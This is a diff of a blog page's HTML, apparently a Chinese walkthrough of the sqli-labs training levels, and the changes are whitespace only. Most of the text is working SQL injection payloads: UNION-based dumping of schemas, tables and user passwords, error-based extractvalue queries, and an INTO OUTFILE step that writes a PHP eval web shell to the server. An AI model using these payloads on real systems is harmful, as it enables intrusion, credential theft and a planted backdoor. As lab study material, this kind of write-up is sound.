@@ -426,29 +426,29 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><ul>
-<li><p>判断是否存在注入  </p>
+<li><p>判断是否存在注入</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sql&#x2F;Less-1&#x2F;?id&#x3D;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>根据报错信息,说明是字符型注入,闭合方式为’</p>
 </li>
-<li><p>猜字段的数量,根据我们传入id最终查询到结果的列数  </p>
+<li><p>猜字段的数量,根据我们传入 id 最终查询到结果的列数</p>
 <pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39;order by 3--+  正常
 ?id&#x3D;1&#39;order by 4--+  报错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p>说明字段数为3</p>
+<p>说明字段数为 3</p>
 </li>
-<li><p>报显示位,id必须是查询不到的数据<br><code>?id=-1&#39; union select 1,2,3--+</code></p>
-<p>显示2,3位</p>
+<li><p>报显示位,id 必须是查询不到的数据<br><code>?id=-1&#39; union select 1,2,3--+</code></p>
+<p>显示 2,3 位</p>
 </li>
 <li><p>查询详细信息<br><code>?id=-1&#39; union select 1,concat_ws(&#39;~&#39;,database(),version(),user()),3--+</code><br>当前数据库,数据库版本,当前用户</p>
 </li>
-<li><p>查询具体  </p>
+<li><p>查询具体</p>
 <ul>
-<li><p>数据库 <code>?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code>  </p>
+<li><p>数据库 <code>?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p>
 </li>
-<li><p>查询数据库对应表<br><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code>  </p>
+<li><p>查询数据库对应表<br><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
 </li>
-<li><p>查询表中的列<code>?id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+  </code>  </p>
+<li><p>查询表中的列<code>?id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+  </code></p>
 </li>
 <li><p>查数据<br><code>?id=-1&#39; union select 1,group_concat(id,0x3a,username,0x3a,password),3 from security.users --+</code></p>
 </li>
@@ -466,7 +466,7 @@
 <ul>
 <li><p>爆表名</p>
 <p><code>?id=&#39; and (select extractvalue(1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=database()))))--+</code></p>
-<p>报错<code>Subquery returns more than 1 row</code> 可以加上limit来截取</p>
+<p>报错<code>Subquery returns more than 1 row</code> 可以加上 limit 来截取</p>
 <p><code>?id=&#39; and (select extractvalue(1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=database() limit 0,1))))--+</code></p>
 <p>改变参数,爆出所有表</p>
 </li>
@@ -476,14 +476,14 @@
 <p><code>?id=&#39; and (select extractvalue(1,concat(&#39;~&#39;,(select concat_ws(&#39;~&#39;,id,password) from users limit 0,1))))--+</code></p>
 </li>
 </ul>
-<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>双引号闭合,操作同Less-5</p>
-<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p><code>?id=1</code>由回显结果提示知使用outfile函数</p>
+<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>双引号闭合,操作同 Less-5</p>
+<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p><code>?id=1</code>由回显结果提示知使用 outfile 函数</p>
 <p>判断注入点,<code>&#39;))&#39;</code>闭合</p>
 <p>首先通过前面的关卡查出数据库相关参数<code>/Less-1/?id=-1&#39; union select 1,@@datadir,@@secure_file_priv --+</code></p>
-<p>首先在mysql配置文件内加入<code>secure_file_priv=&quot;&quot;</code></p>
+<p>首先在 mysql 配置文件内加入<code>secure_file_priv=&quot;&quot;</code></p>
 <p>写入一句话木马</p>
 <p><code>?id=&#39;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;&quot; into outfile &quot;E:/phpstudy_pro/www/sqli/Less-7/2.php&quot; --+</code></p>
-<p>可以看到,在目标目录下有了2.php的文件,使用蚁剑连接</p>
+<p>可以看到,在目标目录下有了 2.php 的文件,使用蚁剑连接</p>
 <h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2>
                 
             </div>
